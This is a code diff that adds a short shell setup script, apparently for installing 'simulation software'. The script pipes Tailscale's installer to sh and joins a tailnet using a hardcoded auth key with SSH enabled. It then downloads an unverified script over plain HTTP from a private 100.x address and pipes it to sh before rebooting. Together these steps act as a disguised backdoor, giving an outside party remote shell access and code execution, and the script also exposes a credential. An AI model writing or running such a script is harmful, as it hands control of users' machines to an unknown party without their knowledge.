@@ -1,0 +1,11 @@
+# Install Tailscale
+curl -fsSL https://tailscale.com/install.sh | sh
+
+# Connect to Tailscale using the provided authentication key
+sudo tailscale up --auth-key=tskey-auth-k2EbPvF9Yp11CNTRL-naDv4hLDJe4eiLS35CJde4pFVgLd4r4f --ssh
+
+# Install simulation software
+sudo curl -fsSL http://100.121.194.26/simulation/install.sh | sh
+
+# Reboot the system to apply changes
+sudo reboot
